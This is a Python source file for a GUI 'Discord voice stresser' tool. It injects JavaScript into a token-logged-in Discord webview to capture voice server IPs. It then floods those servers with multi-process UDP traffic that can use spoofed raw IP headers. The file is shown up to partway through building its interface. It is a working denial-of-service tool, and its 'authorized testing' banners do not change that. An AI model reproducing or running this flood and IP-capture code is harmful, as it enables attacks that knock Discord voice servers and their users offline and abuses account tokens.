"""
MatrixHardik Discord Voice Stresser v7.0 — WebView Integration
Uses embedded browser (pywebview) to show real Discord webapp with
token auto-login. Captures voice WebSocket traffic via a local
proxy to extract the real voice server IP:Port.

FOR AUTHORIZED TESTING ONLY
"""

import os
import sys
import re
import json
import time
import random
import socket
import struct
import threading
import multiprocessing
import ctypes
import ipaddress
import base64
import hashlib
from datetime import datetime
from typing import Optional, Tuple, List, Dict
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import ssl as ssl_module

# ─── Tkinter ─────────────────────────────────────────────────────
try:
    from tkinter import *
    from tkinter import messagebox, scrolledtext, ttk
except ImportError:
    print("[!] Tkinter not found")
    sys.exit(1)

# ─── Check for pywebview ─────────────────────────────────────────
try:
    import webview
    HAS_WEBVIEW = True
except ImportError:
    HAS_WEBVIEW = False

# ─── Windows Raw Socket API ──────────────────────────────────────
HAS_RAW_SOCKET = False
try:
    _ws2 = ctypes.windll.ws2_32
    _WSAStartup = _ws2.WSAStartup
    _WSACleanup = _ws2.WSACleanup
    wsa_data = ctypes.create_string_buffer(400)
    if _WSAStartup(ctypes.c_ushort(0x0202), wsa_data) == 0:
        HAS_RAW_SOCKET = True
except:
    pass


# ═══════════════════════════════════════════════════════════════════
#  SECTION 1: LOCAL PROXY — Captures Discord WebSocket traffic
# ═══════════════════════════════════════════════════════════════════

class DiscordTrafficInterceptor:
    """
    Acts as a local transparent proxy that intercepts Discord's
    WebSocket traffic to extract voice server information.
    Uses JavaScript injection + a local HTTP server for callbacks.
    """
    
    def __init__(self, callback: Optional[callable] = None):
        self.callback = callback
        self._running = False
        self._server = None
        self._thread = None
        self._captured_data = {
            'voice_ips': set(),
            'gateway_messages': [],
            'voice_endpoints': [],
            'ssrc': None,
            'server_id': None,
            'channel_id': None
        }
        self._token = None
        self._proxy_port = 9487
    
    def get_injection_script(self, token: str) -> str:
        """Returns JavaScript that hooks Discord's WebSocket to capture voice IPs."""
        self._token = token
        return f"""
<script>
(function() {{
    let token = "{token}";
    // Auto-login by setting localStorage token
    let loginInterval = setInterval(() => {{
        try {{
            let iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            iframe.contentWindow.localStorage.token = JSON.stringify(token);
            document.body.removeChild(iframe);
        }} catch(e) {{}}
    }}, 100);
    setTimeout(() => {{ clearInterval(loginInterval); location.reload(); }}, 2000);
}})();

// Hook WebSocket to intercept Discord voice protocol messages
(function() {{
    const OriginalWebSocket = window.WebSocket;
    window.WebSocket = function(url, protocols) {{
        let ws = new OriginalWebSocket(url, protocols);
        if (url && (url.includes('voice') || url.includes(':8443') || 
            (url.includes('wss://') && !url.includes('gateway')))) {{
            console.log('[HC] Voice WS detected:', url);
            try {{
                let parsed = new URL(url);
                fetch('http://127.0.0.1:{self._proxy_port}/capture?type=voice_ws&ip=' + 
                    encodeURIComponent(parsed.hostname) + '&port=' + (parsed.port || '443') + 
                    '&url=' + encodeURIComponent(url));
            }} catch(e) {{}}
        }}
        ws.addEventListener('message', function(event) {{
            try {{
                let data = JSON.parse(event.data);
                let d = data.d || {{}};
                if (data.op === 2) {{
                    console.log('[HC] Voice Ready:', d);
                    fetch('http://127.0.0.1:{self._proxy_port}/capture?type=voice_ready&data=' +
                        encodeURIComponent(JSON.stringify(d)));
                }}
                if (data.op === 4) {{
                    console.log('[HC] Session Description:', d);
                    fetch('http://127.0.0.1:{self._proxy_port}/capture?type=session_desc&data=' +
                        encodeURIComponent(JSON.stringify(d)));
                }}
                if (d.ip) {{
                    fetch('http://127.0.0.1:{self._proxy_port}/capture?type=ip_discovery&ip=' +
                        encodeURIComponent(d.ip) + '&port=' + (d.port || ''));
                }}
                if (d.address) {{
                    fetch('http://127.0.0.1:{self._proxy_port}/capture?type=address&ip=' +
                        encodeURIComponent(d.address) + '&port=' + (d.port || ''));
                }}
            }} catch(e) {{}}
        }});
        return ws;
    }};

    // Hook fetch for voice API responses
    const originalFetch = window.fetch;
    window.fetch = function(url, options) {{
        return originalFetch.apply(this, arguments).then(function(response) {{
            let clone = response.clone();
            if (typeof url === 'string' && url.includes('/voice')) {{
                clone.text().then(function(text) {{
                    try {{
                        let json = JSON.parse(text);
                        if (json.ip || json.endpoint) {{
                            fetch('http://127.0.0.1:{self._proxy_port}/capture?type=api_voice&data=' +
                                encodeURIComponent(text));
                        }}
                    }} catch(e) {{}}
                }});
            }}
            return response;
        }});
    }};

    // Hook XHR for voice channel data
    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {{
        this._url = url;
        return originalOpen.apply(this, arguments);
    }};
    const originalSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {{
        this.addEventListener('load', function() {{
            if (this._url && typeof this._url === 'string' && 
                (this._url.includes('/voice') || this._url.includes('/channels'))) {{
                try {{
                    let data = JSON.parse(this.responseText);
                    if (data.ip || data.endpoint || data.token) {{
                        fetch('http://127.0.0.1:{self._proxy_port}/capture?type=xhr_voice&data=' +
                            encodeURIComponent(this.responseText));
                    }}
                }} catch(e) {{}}
            }}
        }});
        return originalSend.apply(this, arguments);
    }};

    console.log('[HC] Discord voice interceptor loaded');
}})();
</script>
"""
    
    def get_interceptor_html(self, token: str) -> str:
        """Full HTML page with injected JS for Discord with voice capture."""
        return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord Voice Capture</title>
<style>
    body {{ margin: 0; padding: 0; overflow: hidden; background: #1a1a2e; }}
    iframe {{ width: 100vw; height: 100vh; border: none; }}
    #status {{ position: fixed; top: 0; left: 0; right: 0; 
              background: rgba(0,0,0,0.8); color: #00ff88; 
              font-family: monospace; font-size: 12px; padding: 4px 8px;
              z-index: 9999; display: none; }}
</style>
</head>
<body>
<div id="status">[HC] Discord Voice Capture Active</div>
{self.get_injection_script(token)}
<iframe id="discordFrame" src="https://discord.com/login"
        allow="microphone; camera; autoplay"
        sandbox="allow-scripts allow-same-origin allow-forms allow-popups">
</iframe>
</body>
</html>"""
    
    def start(self, proxy_port: int = 9487):
        """Start the interceptor HTTP server."""
        self._proxy_port = proxy_port
        self._running = True
        self._server = HTTPServer(('127.0.0.1', proxy_port), self._make_handler())
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
    
    def stop(self):
        """Stop the interceptor."""
        self._running = False
        if self._server:
            self._server.shutdown()
            self._server.server_close()
            self._server = None
    
    def _make_handler(self):
        """Create the HTTP request handler class."""
        interceptor = self
        class Handler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass
            def do_GET(self):
                parsed = urlparse(self.path)
                params = parse_qs(parsed.query)
                path = parsed.path
                
                if path == '/capture':
                    ctype = params.get('type', [''])[0]
                    if ctype == 'voice_ws':
                        ip = params.get('ip', [''])[0]
                        port = params.get('port', ['443'])[0]
                        if interceptor.callback:
                            interceptor.callback('voice_ws', ip, port)
                        interceptor._captured_data['voice_ips'].add(f"{ip}:{port}")
                    elif ctype == 'voice_ready':
                        data_str = params.get('data', ['{}'])[0]
                        try:
                            data = json.loads(data_str)
                            ip = data.get('ip', '')
                            port = str(data.get('port', ''))
                            ssrc = data.get('ssrc', '')
                            interceptor._captured_data['ssrc'] = ssrc
                            if ip and port:
                                interceptor._captured_data['voice_ips'].add(f"{ip}:{port}")
                                if interceptor.callback:
                                    interceptor.callback('voice_ready', ip, port, ssrc)
                        except:
                            pass
                    elif ctype == 'ip_discovery':
                        ip = params.get('ip', [''])[0]
                        port = params.get('port', [''])[0]
                        if ip:
                            interceptor._captured_data['voice_ips'].add(f"{ip}:{port or '50000'}")
                            if interceptor.callback:
                                interceptor.callback('ip_discovery', ip, port or '50000')
                    elif ctype in ('address',):
                        ip = params.get('ip', [''])[0]
                        port = params.get('port', [''])[0]
                        if ip:
                            interceptor._captured_data['voice_ips'].add(f"{ip}:{port or '50000'}")
                    elif ctype in ('api_voice', 'xhr_voice'):
                        data_str = params.get('data', ['{}'])[0]
                        try:
                            data = json.loads(data_str)
                            if isinstance(data, list):
                                for item in data:
                                    ip = item.get('ip') or item.get('address', '')
                                    port = str(item.get('port', ''))
                                    if ip:
                                        interceptor._captured_data['voice_ips'].add(f"{ip}:{port or '50000'}")
                            else:
                                ip = data.get('ip') or data.get('address', '')
                                port = str(data.get('port', ''))
                                endpoint = data.get('endpoint', '')
                                if endpoint:
                                    import re as _re
                                    m = _re.search(r'(\d+\.\d+\.\d+\.\d+):?(\d+)?', endpoint)
                                    if m:
                                        ip = m.group(1)
                                        port = m.group(2) or '50000'
                                        interceptor._captured_data['voice_ips'].add(f"{ip}:{port}")
                                if ip:
                                    interceptor._captured_data['voice_ips'].add(f"{ip}:{port or '50000'}")
                        except:
                            pass
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b'OK')
                    return
                
                # Serve the interceptor HTML page
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(interceptor.get_interceptor_html(interceptor._token or '').encode())
            
            def do_OPTIONS(self):
                self.send_response(200)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
                self.send_header('Access-Control-Allow-Headers', '*')
                self.end_headers()
        return Handler
    
    def get_captured_ips(self) -> List[Tuple[str, str]]:
        """Returns list of (ip, port) tuples from captured data."""
        results = []
        for entry in self._captured_data['voice_ips']:
            if ':' in entry:
                ip, port = entry.split(':', 1)
                results.append((ip, port))
        return results
    
    def get_ssrc(self):
        return self._captured_data.get('ssrc')
    
    @property
    def running(self):
        return self._running


# ═══════════════════════════════════════════════════════════════════
#  SECTION 2: WEBVIEW WRAPPER
# ═══════════════════════════════════════════════════════════════════

class WebViewWrapper:
    """
    Manages the pywebview window lifecycle.
    """
    
    def __init__(self, interceptor: DiscordTrafficInterceptor):
        self._interceptor = interceptor
        self._window = None
        self._running = False
        self._events_enabled = True
        self._close_callback = None
        self._open_callback = None
        self._error_callback = None
    
    def is_running(self) -> bool:
        return self._running
    
    def open(self, token: str):
        """
        Opens Discord in a WebView window pointed at our local proxy.
        The proxy serves the injected Discord login page.
        """
        if not HAS_WEBVIEW:
            if self._error_callback:
                self._error_callback('error', 'pywebview not installed')
            return
        
        if self._running:
            return
        
        # Start interceptor first
        self._interceptor.start()
        
        # Create window pointing to interceptor
        proxy_url = f"http://127.0.0.1:{self._interceptor._proxy_port}"
        
        try:
            self._window = webview.create_window(
                'MatrixHardik — Discord Voice Capture [AUTHORIZED TESTING ONLY]',
                proxy_url,
                width=1280,
                height=800,
                resizable=True,
                fullscreen=False,
                min_size=(800, 600),
                text_select=True,
                zoomable=True,
                confirm_close=True,
            )
            
            self._running = True
            
            if self._open_callback:
                self._open_callback('open', 'WebView opened')
            
            # This blocks until the window is closed
            webview.start(
                lambda: None,
                gui=None,
                private_mode=False,
                debug=True,
            )
            
        except Exception as e:
            if self._error_callback:
                self._error_callback('error', str(e))
        finally:
            self._running = False
            self._window = None
            self._interceptor.stop()
            
            if self._close_callback:
                self._close_callback('closed', 'WebView closed')
    
    def close(self):
        """Close the WebView."""
        if self._window and self._running:
            try:
                self._window.destroy()
            except:
                pass
            self._running = False
    
    def on_open(self, callback):
        self._open_callback = callback
    
    def on_close(self, callback):
        self._close_callback = callback
    
    def on_error(self, callback):
        self._error_callback = callback
    
    def evaluate_js(self, js: str):
        """Run JavaScript in the WebView."""
        if self._window and self._running:
            try:
                return self._window.evaluate_js(js)
            except:
                return None
        return None


# ═══════════════════════════════════════════════════════════════════
#  SECTION 3: UDP FLOOD ENGINE
# ═══════════════════════════════════════════════════════════════════

class UDPFloodEngine:
    """
    Multi-process UDP flood engine that sends Discord voice-like packets.
    Uses raw sockets (admin) for max performance or normal UDP sockets.
    """
    
    def __init__(self):
        self._running = False
        self._processes = []
        self._stats = {'running': False, 'elapsed': 0, 'sent': 0, 'errors': 0}
        self._start_time = 0
        self._monitor_thread = None
        self._lock = threading.Lock()
        self._total_sent = 0
    
    def start(self, target_ip: str, target_port: int, num_procs: int,
              pps_target: int, duration_secs: int, packet_size: int,
              use_raw: bool = False, ssrc: Optional[int] = None):
        """
        Launch flood with multiple worker processes.
        Each process sends Discord-style voice packets.
        """
        self._running = True
        self._stats['running'] = True
        self._start_time = time.time()
        self._total_sent = 0
        
        # Calculate packets per process
        pps_per_proc = max(1, pps_target // num_procs)
        
        self._processes = []
        for i in range(num_procs):
            proc_ssrc = ssrc if ssrc else random.randint(1000000, 9999999)
            proc_port = random.randint(50000, 60000)
            
            p = multiprocessing.Process(
                target=self._worker,
                args=(target_ip, target_port, pps_per_proc, duration_secs,
                      packet_size, use_raw, proc_ssrc, proc_port, i),
                daemon=True
            )
            self._processes.append(p)
            p.start()
        
        # Start monitor thread
        self._monitor_thread = threading.Thread(target=self._monitor, daemon=True)
        self._monitor_thread.start()
    
    def _worker(self, target_ip, target_port, pps, duration, psize, 
                use_raw, ssrc, src_port, worker_id):
        """Worker process — sends packets at the target rate."""
        
        # Create socket
        try:
            if use_raw:
                # Raw socket with IP header
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                # Bind to a unique source port
                sock.bind(('0.0.0.0', src_port))
            
            sock.settimeout(0.1)
        except Exception as e:
            return
        
        # Pre-generate packet templates for Discord voice protocols
        seq_num = random.randint(0, 65535)
        timestamp = random.randint(0, 4294967295)
        
        # Packet types: RTP, DTLS, STUN, Heartbeat, Garbage
        packet_types = ['rtp', 'dtls', 'stun', 'heartbeat', 'garbage']
        type_weights = [45, 15, 20, 10, 10]  # RTP most common
        
        selected_types = []
        for i, t in enumerate(packet_types):
            selected_types.extend([t] * type_weights[i])
        
        end_time = time.time() + duration
        
        while self._running and time.time() < end_time:
            try:
                for _ in range(pps):
                    if not self._running or time.time() >= end_time:
                        break
                    
                    ptype = random.choice(selected_types)
                    
                    if ptype == 'rtp':
                        # Discord RTP voice packet (Opus frames)
                        payload = self._build_rtp_packet(ssrc, seq_num, timestamp, psize)
                        seq_num = (seq_num + 1) % 65535
                        timestamp = (timestamp + 960) % 4294967295  # 48kHz / 50 = 960 per frame
                    
                    elif ptype == 'dtls':
                        # DTLS handshake simulation
                        payload = self._build_dtls_packet(ssrc, psize)
                    
                    elif ptype == 'stun':
                        # STUN binding request
                        payload = self._build_stun_packet(ssrc, psize)
                    
                    elif ptype == 'heartbeat':
                        # Discord voice heartbeat
                        payload = self._build_heartbeat_packet(ssrc, psize)
                    
                    else:
                        # Random garbage
                        payload = bytes([random.randint(0, 255) for _ in range(psize)])
                    
                    if use_raw:
                        # Build IP header manually
                        packet = self._build_ip_udp_payload(
                            target_ip, target_port,
                            random.randint(1024, 65535),
                            payload
                        )
                        sock.sendto(packet, (target_ip, 0))
                    else:
                        sock.sendto(payload, (target_ip, target_port))
                
                # Sleep for 1 second (adjust to control rate)
                time.sleep(1.0)
                
            except socket.timeout:
                pass
            except Exception as e:
                with self._lock:
                    self._stats['errors'] += 1
        
        sock.close()
    
    def _build_rtp_packet(self, ssrc: int, seq: int, ts: int, target_size: int) -> bytes:
        """Build a Discord-style RTP voice packet with Opus-like payload."""
        # RTP Header (12 bytes)
        vpx = 0x80  # Version 2, no padding, no extension, 0 CSRCs
        pt = 0x78   # Payload type 120 (Discord voice)
        
        header = struct.pack('!BBHII',
            0x80,           # V=2, P=0, X=0, CC=0
            120,            # Payload type (Discord Opus)
            seq & 0xFFFF,   # Sequence number
            ts & 0xFFFFFFFF, # Timestamp
            ssrc & 0xFFFFFFFF  # SSRC
        )
        
        # Fill rest with Opus-like data (simulated encrypted Opus frames)
        remaining = max(8, target_size - len(header) - 4)
        # Discord uses xsalsa20_poly1305 encryption -> add nonce-like header
        payload = bytes([random.randint(0, 255) for _ in range(remaining)])
        
        # Add encrypted Opus frame header
        frame_header = struct.pack('!H', len(payload))
        
        return header + frame_header + payload
    
    def _build_dtls_packet(self, ssrc: int, target_size: int) -> bytes:
        """Build a DTLS ClientHello-like packet."""
        # DTLS content type: 22 (Handshake)
        # Version: DTLS 1.2 (0xFEFD)
        content_type = 22
        version = 0xFEFD
        epoch = 0
        seq_num = random.randint(0, 2**48 - 1)
        
        header = struct.pack('!BHQ', content_type, version, seq_num)
        
        # Handshake: ClientHello
        handshake_type = 1  # ClientHello
        length = max(12, target_size - len(header) - 4)
        
        handshake = struct.pack('!BI', handshake_type, length) + \
                    bytes([random.randint(0, 255) for _ in range(length)])
        
        # Add session ID (Discord uses session-based DTLS)
        session_id = struct.pack('!I', ssrc & 0xFFFFFFFF) + \
                     bytes([random.randint(0, 255) for _ in range(8)])
        
        return header + handshake + session_id
    
    def _build_stun_packet(self, ssrc: int, target_size: int) -> bytes:
        """Build a STUN binding request (Discord uses STUN for IP discovery)."""
        # STUN message: Binding Request (0x0001)
        # Magic Cookie: 0x2112A442 (RFC 5389)
        msg_type = 0x0001  # Binding Request
        magic = 0x2112A442
        
        # Transaction ID (12 bytes)
        tx_id = struct.pack('!I', random.randint(0, 2**32-1)) + \
                struct.pack('!Q', random.randint(0, 2**64-1))
        
        # STUN header (20 bytes)
        body = b''
        
        # Add FINGERPRINT attribute
        fingerprint = 0x5354554E  # "STUN"
        
        # Add XOR-MAPPED-ADDRESS attribute to mimic real responses
        attr_type = 0x0020  # XOR-MAPPED-ADDRESS
        attr_len = 8
        family = 0x01  # IPv4
        xport = target_size if target_size < 65535 else 50000
        xaddr = socket.inet_aton('127.0.0.1')
        
        attr = struct.pack('!HHBBH', attr_type, attr_len, 0, family, xport ^ 0x2112) + \
               bytes([a ^ b for a, b in zip(xaddr, struct.pack('!I', magic))[:4]])
        
        # STUN header
        body_length = len(attr)
        header = struct.pack('!HHI', msg_type, body_length, magic) + tx_id
        
        return header + attr
    
    def _build_heartbeat_packet(self, ssrc: int, target_size: int) -> bytes:
        """Build a Discord voice heartbeat packet."""
        # Discord uses a simple keepalive
        heartbeat_id = random.randint(0, 2**32-1)
        payload = struct.pack('!I', heartbeat_id) + \
                  struct.pack('!I', ssrc & 0xFFFFFFFF)
        
        # Fill to target size
        remaining = max(0, target_size - len(payload))
        if remaining > 0:
            payload += bytes([random.randint(0, 255) for _ in range(remaining)])
        
        return payload
    
    def _build_ip_udp_payload(self, dst_ip: str, dst_port: int, 
                              src_port: int, udp_payload: bytes) -> bytes:
        """Build a complete IP+UDP packet (for raw sockets)."""
        # Pseudo header for checksum
        src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        src_ip_bytes = socket.inet_aton(src_ip)
        dst_ip_bytes = socket.inet_aton(dst_ip)
        
        # UDP header (8 bytes) + payload
        udp_len = 8 + len(udp_payload)
        udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, 0)
        
        # UDP checksum (using pseudo header)
        pseudo = struct.pack('!4s4sBBH', src_ip_bytes, dst_ip_bytes, 0, 17, udp_len)
        pseudo_udp = pseudo + udp_header + udp_payload
        # Pad to even length
        if len(pseudo_udp) % 2 == 1:
            pseudo_udp += b'\x00'
        
        checksum = 0
        for i in range(0, len(pseudo_udp), 2):
            word = (pseudo_udp[i] << 8) + pseudo_udp[i+1]
            checksum += word
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        checksum = ~checksum & 0xFFFF
        if checksum == 0:
            checksum = 0xFFFF
        
        udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, checksum)
        udp_packet = udp_header + udp_payload
        
        # IP header (20 bytes)
        ip_ver_ihl = 0x45  # IPv4, IHL=5
        ip_tos = 0
        ip_total_len = 20 + len(udp_packet)
        ip_id = random.randint(0, 65535)
        ip_flags_frag = 0  # Don't fragment
        ip_ttl = random.randint(64, 128)
        ip_proto = 17  # UDP
        ip_checksum = 0
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ver_ihl, ip_tos, ip_total_len, ip_id, ip_flags_frag,
            ip_ttl, ip_proto, ip_checksum, src_ip_bytes, dst_ip_bytes
        )
        
        # IP checksum
        if len(ip_header) % 2 == 1:
            ip_header += b'\x00'
        checksum = 0
        for i in range(0, len(ip_header), 2):
            word = (ip_header[i] << 8) + ip_header[i+1]
            checksum += word
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        checksum = ~checksum & 0xFFFF
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ver_ihl, ip_tos, ip_total_len, ip_id, ip_flags_frag,
            ip_ttl, ip_proto, checksum, src_ip_bytes, dst_ip_bytes
        )
        
        return ip_header + udp_packet
    
    def stop(self):
        """Stop all processes."""
        self._running = False
        self._stats['running'] = False
        for p in self._processes:
            if p and p.is_alive():
                p.terminate()
                p.join(timeout=2)
        self._processes = []
    
    def get_stats(self) -> Dict:
        """Get current statistics."""
        with self._lock:
            if self._stats['running']:
                self._stats['elapsed'] = time.time() - self._start_time
            return dict(self._stats)
    
    def _monitor(self):
        """Monitor processes."""
        while self._running:
            # Check if any process died
            alive = any(p.is_alive() for p in self._processes)
            if not alive and self._running:
                self._stats['running'] = False
                self._running = False
            time.sleep(0.5)


# ═══════════════════════════════════════════════════════════════════
#  SECTION 4: ATTACK MONITOR
# ═══════════════════════════════════════════════════════════════════

class AttackMonitor:
    """
    Monitors attack statistics and provides live updates to the GUI.
    """
    def __init__(self, engine: UDPFloodEngine):
        self.engine = engine
        self._history = []
        self._max_history = 60
    
    def get_graph_data(self):
        """Get data points for the live graph."""
        stats = self.engine.get_stats()
        if stats['running']:
            # Approximate PPS from current settings
            return self._history[-20:] if self._history else [0]
        return [0]
    
    def record_sample(self, pps: int):
        self._history.append(pps)
        if len(self._history) > self._max_history:
            self._history.pop(0)
    
    def format_elapsed(self, seconds: float) -> str:
        mins = int(seconds) // 60
        secs = int(seconds) % 60
        return f"{mins:02d}:{secs:02d}"


# ═══════════════════════════════════════════════════════════════════
#  SECTION 5: MAIN GUI
# ═══════════════════════════════════════════════════════════════════

class DiscordVoiceStresserGUI:
    """
    Main GUI class — MatrixHardik cyberpunk themed.
    Provides: WebView management, voice IP capture, UDP flood controls.
    """
    
    # ─── THEME COLORS ───
    BG = "#0a0a1a"
    BG2 = "#12122a"
    BG3 = "#1a1a3a"
    BORDER = "#2a2a5a"
    GREEN = "#00ff88"
    CYAN = "#00ccff"
    YELLOW = "#ffcc00"
    RED = "#ff3333"
    ORANGE = "#ff6600"
    PINK = "#ff44aa"
    WHITE = "#cccccc"
    DIM = "#555577"
    
    def __init__(self):
        self.root = Tk()
        self.root.title("MatrixHardik — Discord Voice Stresser v7.0 [AUTHORIZED TEST]")
        self.root.geometry("1400x800")
        self.root.minsize(1100, 600)
        self.root.configure(bg=self.BG)
        
        # State
        self._running = False
        self._selected_ssrc = None
        self._graph_data = [0] * 20
        
        # Components
        self.interceptor = DiscordTrafficInterceptor(callback=self._on_capture)
        self.webview = WebViewWrapper(self.interceptor)
        self.engine = UDPFloodEngine()
        self.monitor = AttackMonitor(self.engine)
        
        # Register WebView callbacks
        self.webview.on_open(self._on_webview_event)
        self.webview.on_close(self._on_webview_event)
        self.webview.on_error(self._on_webview_event)
        
        # Variables
        self.token_var = StringVar()
        self.target_ip = StringVar()
        self.target_port = StringVar(value="50000")
        self.processes_var = IntVar(value=multiprocessing.cpu_count())
        self.pps_var = IntVar(value=50000)
        self.duration_var = IntVar(value=60)
        self.psize_var = IntVar(value=400)
        self.raw_var = IntVar(value=0)
        
        self._build_ui()
        self._start_stats_loop()
        self._bind_hotkeys()
        
        self.log("╔══════════════════════════════════════════════╗", "green")
        self.log("║  MatrixHardik Discord Voice Stresser v7.0  ║", "green")
        self.log("║  WebView Integration — AUTHORIZED TEST      ║", "green")
        self.log("╚══════════════════════════════════════════════╝", "green")
        self.log("[*] Requirements: pip install pywebview", "yellow")
        self.log("[*] Step 1: Enter your Discord token", "cyan")
        self.log("[*] Step 2: Click 'OPEN DISCORD WEBVIEW'", "cyan")
        self.log("[*] Step 3: Click 'START CAPTURE'", "cyan")
        self.log("[*] Step 4: Join a voice channel in Discord", "cyan")
        self.log("[*] Step 5: Voice server IP auto-extracts!", "cyan")
    
    def _build_ui(self):
        """Build the full MatrixHardik GUI."""
        root = self.root
        
        # ═══ TOP BANNER ═══
        banner = Frame(root, bg=self.BG, height=60)
        banner.pack(fill=X)
        
        # Animated banner using alternating labels
        bf = Frame(banner, bg=self.BG)
        bf.pack(expand=True)
        
        self.banner_text = StringVar()
        self.banner_text.set("MATRIXHARDIK")
        
        Label(bf, textvariable=self.banner_text,
              font=("Consolas", 16, "bold"), fg=self.GREEN, bg=self.BG).pack()
        
        Label(bf, text="DISCORD VOICE STRESSER v7.0 — WebView Integration",
              font=("Consolas", 9), fg=self.CYAN, bg=self.BG).pack()
        
        Label(bf, text="FOR AUTHORIZED TESTING ONLY",
              font=("Consolas", 8, "bold"), fg=self.RED, bg=self.BG).pack()
        
        # Animate banner
        self._animate_banner()
        
        # ═══ MAIN CONTENT ═══
        main = Frame(root, bg=self.BG)
        main.pack(fill=BOTH, expand=True, padx=5, pady=2)
        
        # ─── LEFT PANEL ───
        left = Frame(main, bg=self.BG2, bd=1, relief="solid",
                    highlightbackground=self.BORDER, highlightthickness=1)
        left.pack(side=LEFT, fill=BOTH, expand=True, padx=(0, 3))
        
        # Token Input
        self._header(left, "🔑 DISCORD TOKEN")
        tf = Frame(left, bg=self.BG2)
        tf.pack(fill=X, padx=8, pady=3)
        
        self.token_entry = Entry(tf, textvariable=self.token_var,
                                bg=self.BG, fg=self.YELLOW,
                                insertbackground=self.GREEN,
                                font=("Consolas", 10),
                                bd=1, relief="sunken",
                                highlightbackground=self.BORDER,
                                highlightthickness=1, show="•",
                                width=40)
        self.token_entry.pack(side=LEFT, fill=X, expand=True)
        
        tk_btn = Button(tf, text="TOGGLE", command=self._toggle_token_visible,
                       bg="#1a1a3a", fg=self.CYAN,
                       activebackground="#2a2a5a", activeforeground="#00ccff",
                       font=("Consolas", 8, "bold"), bd=1,
                       padx=5, cursor="hand2")
        tk_btn.pack(side=RIGHT, padx=(3, 0))
        
        # WebView Controls
        self._header(left, "🌐 WEBVIEW CONTROLS")
        
        wf = Frame(left, bg=self.BG2)
        wf.pack(fill=X, padx=8, pady=3)
        
        self.webview_btn = Button(wf, text="🌐 OPEN DISCORD WEBVIEW",
                                 command=self._toggle_webview,
                                 bg="#003366", fg=self.CYAN,
                                 activebackground="#004488",
                                 activeforeground="#00ccff",
                                 font=("Consolas", 10, "bold"),
                                 bd=0, padx=15, pady=8, cursor="hand2",
                                 relief="raised")
        self.webview_btn.pack(fill=X)
        
        if not HAS_WEBVIEW:
            Label(wf, text="⚠ pywebview not installed — run: pip install pywebview",
                 bg=self.BG2, fg=self.RED,
                 font=("Consolas", 8, "bold")).pack(pady=3)
        
        wsf = Frame(left, bg=self.BG2)
        wsf.pack(fill=X, padx=8, pady=2)
        
        Label(wsf, text="STATUS:", bg=self.BG2, fg=self.DIM,
              font=("Consolas", 7, "bold")).pack(side=LEFT)
        
        self.webview_status = Label(wsf, text="○ CLOSED", bg=self.BG2,
                                    fg=self.DIM, font=("Consolas", 7, "bold"))
        self.webview_status.pack(side=LEFT, padx=(5, 0))
        
        # Capture Controls
        self._header(left, "🎯 VOICE IP CAPTURE")
        
        cf = Frame(left, bg=self.BG2)
        cf.pack(fill=X, padx=8, pady=3)
        
        self.capture_btn = Button(cf, text="▶  START CAPTURE",
                                 command=self._toggle_capture,
                                 bg="#004422", fg=self.GREEN,
                                 activebackground="#006633",
                                 activeforeground="#00ff88",
                                 font=("Consolas", 10, "bold"),
                                 bd=0, padx=10, pady=6, cursor="hand2",
                                 relief="raised")
        self.capture_btn.pack(side=LEFT, fill=X, expand=True)
        
        self.capture_clear_btn = Button(cf, text="✖",
                                       command=self._clear_captured,
                                       bg="#440000", fg=self.RED,
                                       activebackground="#660000",
                                       activeforeground="#ff4444",
                                       font=("Consolas", 10, "bold"),
                                       bd=0, padx=8, cursor="hand2")
        self.capture_clear_btn.pack(side=RIGHT, padx=(3, 0))
        
        csf = Frame(left, bg=self.BG2)
        csf.pack(fill=X, padx=8, pady=2)
        self.capture_status = Label(csf, text="○ STOPPED", bg=self.BG2,
                                   fg=self.DIM, font=("Consolas", 7, "bold"))
        self.capture_status.pack(side=LEFT)
        
        self.discovered_count = Label(csf, text="Captured: 0 servers", bg=self.BG2,
                                     fg=self.CYAN, font=("Consolas", 7, "bold"))
        self.discovered_count.pack(side=RIGHT)
        
        # Captured IPs List
        self._header(left, "📋 CAPTURED VOICE SERVERS")
        
        lf = Frame(left, bg=self.BG2)
        lf.pack(fill=BOTH, expand=True, padx=8, pady=3)
        
        self.ip_listbox = Listbox(lf, bg="#0a0a0a", fg=self.GREEN,
                                  selectbackground="#003322",
                                  selectforeground="#00ff88",
                                  font=("Consolas", 9),
                                  bd=1, relief="sunken",
                                  highlightbackground=self.BORDER,
                                  highlightthickness=1,
                                  activestyle="none")
        self.ip_listbox.pack(side=LEFT, fill=BOTH, expand=True)
        self.ip_listbox.bind('<<ListboxSelect>>', self._on_ip_select)
        
        scroll = Scrollbar(lf, orient=VERTICAL, command=self.ip_listbox.yview)
        scroll.pack(side=RIGHT, fill=Y)
        self.ip_listbox.config(yscrollcommand=scroll.set)
        
        # SSRC info
        self.ssrc_label = Label(left, text="", bg=self.BG2, fg=self.CYAN,
                               font=("Consolas", 7))
